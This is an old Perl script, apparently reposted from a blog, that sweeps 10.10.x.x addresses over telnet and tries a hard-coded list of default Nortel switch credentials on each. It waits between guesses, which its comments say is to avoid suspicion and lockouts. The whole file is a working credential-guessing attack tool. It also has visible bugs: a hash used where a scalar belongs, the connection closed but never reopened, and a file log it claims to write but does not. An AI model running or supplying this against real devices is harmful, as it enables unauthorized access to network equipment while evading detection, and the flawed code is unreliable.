# dumping old code circa 2006
# http://www.infointox.net/?paged=15
#
#!/usr/bin/perl
 
use	Net::Telnet;
 
#Nortels default username/passwords
@norteldefault = ('rwa','rw','ro','l3','l2','l1','operator','slbop','slbadmin');
 
#all switches ip
$top=254;
$bot=126;
 
#gernerate hosts to test
for($a= 1; $a &lt; 100; $a++){
 
#creat host for every class we want to scan and push on array
#just comment out blocks you dont want to scan or add more
 
#192.168.*.1,253
#$temp ="192.1.".$a.".".$top;
#push @hosts,$temp;
#$temp ="192.168.".$a.".".$bot;
#push @hosts,$temp;
 
#192.1.*.1,253
#$temp ="192.1.".$a.".".$top;
#push @hosts,$temp;
#$temp ="192.1.".$a.".".$bot;
#push @hosts,$temp;
 
#10.10.*.1,253
$temp ="10.10.".$a.".".$top;
push @hosts,$temp;
$temp ="10.10.".$a.".".$bot;
push @hosts,$temp;
}
 
#setup telnet
$telnet = new Net::Telnet (Timeout =&gt; 3, Errmode =&gt; "return");
 
#main loop to do the fun
foreach $host (@hosts){
	chomp $host;
	if($telnet-&gt; open($host)){
		print "\nConnected to $host";
 
		foreach $userpass (@norteldefault) {
			chomp $userpass;
			$user = $userpass;
			$pass = %userpass;
			&amp;login;
			sleep (30);	
		};
	}
	else{print "\nCould Not Connect To $host"}
};
 
####old testing 
#sub conn{
#
#$telnet = new Net::Telnet (Timeout =&gt; 3, Errmode =&gt; "return");
#if($telnet-&gt; open($host)){
#	$connect=1;
#	&amp;login;
#}
#};
 
sub login{
print "\nTrying To login with $userpass";
print "\nWaiting 30sec before next guess. prevent susp. and lockouts";
if($telnet -&gt; login($userpass,$userpass)){
	print "\nLogged In With $userpass To $host !!!!";
	print "\nThis has been logged to File!!!!";
}
$telnet -&gt; close;
};
